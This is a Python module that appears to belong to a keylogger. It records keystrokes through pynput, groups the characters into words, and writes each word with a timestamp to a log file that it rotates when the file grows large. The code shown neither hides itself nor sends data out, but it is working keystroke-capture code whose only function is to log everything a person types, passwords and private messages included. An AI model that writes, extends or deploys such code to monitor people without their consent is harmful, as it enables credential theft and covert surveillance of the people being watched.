import os
import time
from datetime import datetime
from pynput.keyboard import Key
from config import KEYLOG_FILE

MAX_SIZE = 1_000_000
last_time = None
current_word = ""

def rotate_file_if_needed():
    if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > MAX_SIZE:
        base, ext = os.path.splitext(KEYLOG_FILE)
        rotated = f"{base}_old{ext}"
        os.rename(KEYLOG_FILE, rotated)

def flush_word():
    """Write the current word to the log with a single timestamp."""
    global current_word
    if current_word.strip() == "":
        current_word = ""
        return

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"{timestamp} - {current_word}\n"

    try:
        with open(KEYLOG_FILE, "a") as log_key:
            log_key.write(entry)
    except IOError as e:
        print(f"File error: {e}")

    current_word = ""  # reset buffer

def key_pressed(key):
    global last_time, current_word
    rotate_file_if_needed()

    now = time.time()

    # Rule 1: Timeout > 1 second → flush word
    if last_time is not None and (now - last_time) > 1:
        flush_word()

    # Rule 2: Detect space in ANY form
    if key == Key.space:
        flush_word()
        last_time = now
        return

    try:
        char = key.char
    except AttributeError:
        # SPECIAL KEYS MUST RETURN IMMEDIATELY
        last_time = now
        return

    # Literal space (some layouts send this instead of Key.space)
    if char == " ":
        flush_word()
        last_time = now
        return

    # Otherwise append to current word
    current_word += char
    last_time = now
